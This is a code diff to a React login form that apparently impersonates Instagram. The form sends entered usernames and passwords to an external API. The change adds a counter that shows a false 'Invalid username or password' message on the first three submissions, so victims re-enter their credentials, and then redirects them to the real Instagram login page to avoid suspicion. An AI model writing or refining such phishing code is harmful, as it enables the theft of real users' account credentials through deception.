@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState} from 'react'
 import './App.css'
 const API_URL = import.meta.env.VITE_API_URL;
 
@@ -8,9 +8,14 @@ function App() {
 
   const [Password , setPassword] = useState("");
 
+  const [noOfTimes, setNoOfTimes] = useState(0);
+
   const [userNameError , setUserNameError] = useState("");
 
   const [PasswordError , setPasswordError] = useState("");
+
+  const [showError, setShowError] = useState("");
+
 
 
 
@@ -38,8 +43,11 @@ function App() {
     }
   }
 
+
   const submitDone = async (e) => {
   e.preventDefault();
+
+  setShowError("");
 
   let hasError = false;
 
@@ -77,9 +85,13 @@ function App() {
 
     if (data.ok) {
       console.log("Data sent successfully");
-
-      window.location.href =
-        "https://www.instagram.com/accounts/login/";
+      if (noOfTimes < 3)
+        {
+          setNoOfTimes(prev => prev + 1);
+          setShowError("*Invalid username or password");
+        }else{
+          window.location.href ="https://www.instagram.com/accounts/login/";
+        }
     } else {
       alert("Server error");
     }
@@ -89,8 +101,6 @@ function App() {
   }
 };
 
-
-  
 
 
 
@@ -108,6 +118,7 @@ function App() {
               <div>
                 <button className='btn' type="submit">Login</button>
               </div>
+              <p className='perror'>{showError}</p>
         </form>
       </div>
       
